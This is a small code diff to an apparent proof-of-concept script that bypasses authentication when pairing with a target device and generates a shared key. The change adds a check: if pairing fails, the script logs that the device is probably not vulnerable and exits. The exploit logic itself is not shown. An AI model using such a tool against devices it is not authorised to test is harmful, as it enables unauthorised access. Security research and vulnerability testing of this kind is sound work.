@@ -64,7 +64,11 @@ def main():
     # Run the PoC!
     log_info(f"Avoiding authentication with {args.address}...")
     log_info(f"Generating shared key...")
-    pair(target, verbose=args.verbose)
+    paired = pair(target, verbose=args.verbose)
+    if not paired:
+        log_warn(f"Authentication error while trying to pair")
+        log_warn(f"The device probably is not vulnerable...")
+        return
     log_warn(f"Key generated")
     log_info(f"The device is vulnerable!")
 
